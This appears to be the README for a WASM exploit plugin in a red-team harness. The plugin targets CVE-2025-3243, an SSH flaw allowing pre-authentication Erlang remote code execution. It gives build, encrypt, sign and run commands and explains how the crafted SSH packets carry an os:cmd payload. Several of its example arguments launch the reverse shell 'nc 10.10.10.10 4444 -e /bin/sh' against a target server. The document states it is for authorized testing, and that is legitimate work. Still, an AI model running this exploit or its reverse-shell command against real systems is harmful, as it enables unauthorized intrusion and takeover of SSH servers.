# CVE-2025-3243 Exploit Plugin

A harness plugin that exploits CVE-2025-3243, an SSH vulnerability that allows pre-authentication channel requests with Erlang RCE payloads.

## Building

```bash
cargo build --target wasm32-wasip1 --release
```

The compiled WASM will be at: `target/wasm32-wasip1/release/cve_2025_3243_plugin.wasm`

## Encrypting, Signing, and Running

### Option 1: Direct Encryption

```bash
# First, encrypt the plugin (Exploit Owner)
./bin/encrypt \
  -plugin examples/cve-2025-3243/target/wasm32-wasip1/release/cve_2025_3243_plugin.wasm \
  -type wasm \
  -harness-key harness_public.pem \
  -target-key target_public.pem \
  -exploit-keystore-key "exploit-key" \
  -output examples/cve-2025-3243/cve-2025-3243.encrypted

# Then, sign with execution arguments (Target)
./bin/sign \
  -file examples/cve-2025-3243/cve-2025-3243.encrypted \
  -target-keystore-key "target-key" \
  -exploit-key exploit_public.pem \
  -harness-key harness_public.pem \
  -args '{"target":"192.168.1.100","port":22,"command":"nc 10.10.10.10 4444 -e /bin/sh"}' \
  -output examples/cve-2025-3243/cve-2025-3243.approved

# Finally, execute the plugin (Harness)
./bin/harness \
  -file examples/cve-2025-3243/cve-2025-3243.approved \
  -harness-keystore-key "harness-key" \
  -target-key target_public.pem \
  -exploit-key exploit_public.pem
```

### Option 2: Store First, Then Encrypt

```bash
# First, store the plugin (Exploit Owner) - encrypts to your own key
./bin/store \
  -plugin examples/cve-2025-3243/target/wasm32-wasip1/release/cve_2025_3243_plugin.wasm \
  -type wasm \
  -harness-key harness_public.pem \
  -exploit-keystore-key "exploit-key" \
  -output examples/cve-2025-3243/cve-2025-3243.wasm.stored

# Later, encrypt from stored file (Exploit Owner)
./bin/encrypt \
  -plugin examples/cve-2025-3243/cve-2025-3243.wasm.stored \
  -type wasm \
  -harness-key harness_public.pem \
  -target-key target_public.pem \
  -exploit-keystore-key "exploit-key" \
  -output examples/cve-2025-3243/cve-2025-3243.encrypted

# Then, sign with execution arguments (Target)
./bin/sign \
  -file examples/cve-2025-3243/cve-2025-3243.encrypted \
  -target-keystore-key "target-key" \
  -exploit-key exploit_public.pem \
  -harness-key harness_public.pem \
  -args '{"target":"192.168.1.100","port":22,"command":"nc 10.10.10.10 4444 -e /bin/sh"}' \
  -output examples/cve-2025-3243/cve-2025-3243.approved

# Finally, execute the plugin (Harness)
./bin/harness \
  -file examples/cve-2025-3243/cve-2025-3243.approved \
  -harness-keystore-key "harness-key" \
  -target-key target_public.pem \
  -exploit-key exploit_public.pem
```

## Plugin Storage

The harness system makes no assumptions about how you store your exploit plugins. You can use any storage infrastructure you prefer (S3, databases, file systems, etc.). The system is designed to be compatible with existing infrastructure.

If you don't have storage infrastructure set up, the `store` command provides an easy option that works within the existing cryptosystem:

- **Stored files** (`.stored` extension) are encrypted to the exploit owner's key, giving you full control
- Only you (the exploit owner) can decrypt stored files using your `exploit-keystore-key`
- The `encrypt` command automatically detects stored files and can re-encrypt them for targets
- Stored files use the same encryption format as regular encrypted files, just encrypted to your key instead of the target's key

The `store` command is optional - you can use any storage mechanism you prefer. The `encrypt` command accepts both raw plugin binaries and stored files transparently.

## Arguments

- `target` (required, string): Target SSH server IP
- `port` (required, integer): Target SSH server port
- `command` (required, string): Command to execute via Erlang RCE

### Example Usage

```bash
-args '{"target":"192.168.1.100","port":22,"command":"nc 10.10.10.10 4444 -e /bin/sh"}'
```

## How It Works

This plugin exploits an SSH vulnerability by:

1. Preparing SSH protocol packets including:
   - SSH banner exchange
   - Fake KEXINIT packet
   - Channel open request
   - Channel exec request with Erlang RCE payload

2. The Erlang RCE payload executes: `os:cmd("<command>").` where `<command>` is the configurable command provided in the arguments.

3. Returns the prepared packet structure with hex-encoded payloads

**Note:** WASM plugins running in Extism cannot make raw TCP socket connections. This plugin prepares all the necessary SSH protocol packets and returns them in hex-encoded format. To execute the exploit, you would need to:
- Use the returned hex-encoded packets with a tool that can make raw TCP connections
- Or implement a proxy/wrapper that can execute the packets on behalf of the plugin

## Security Note

This plugin is for authorized security testing only. Use only on systems you own or have explicit permission to test.

